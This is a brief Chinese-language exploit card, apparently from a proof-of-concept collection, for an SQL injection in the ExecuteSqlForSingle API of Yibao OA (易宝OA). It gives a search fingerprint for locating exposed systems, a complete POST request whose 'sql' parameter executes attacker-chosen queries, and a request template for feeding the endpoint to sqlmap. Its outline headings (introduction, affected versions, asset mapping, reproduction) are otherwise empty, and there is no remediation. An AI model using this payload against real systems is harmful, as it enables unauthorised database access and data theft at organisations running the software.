# 易宝OAExecuteSqlForSingleSQL注入漏洞

- **系统**：易宝OAExecuteSqlForSingle　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title="欢迎登录易宝OA系统"`
- **请求**：`POST /api/system/ExecuteSqlForSingle HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 103`

**请求体 / payload**
```
token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)&strParameters=

sqlmap
POST /api/system/ExecuteSqlForSingle HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
token=zxh&sql=1&strParameters=
```

**其他**
- 易宝OA ExecuteSqlForSingle SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 易宝OA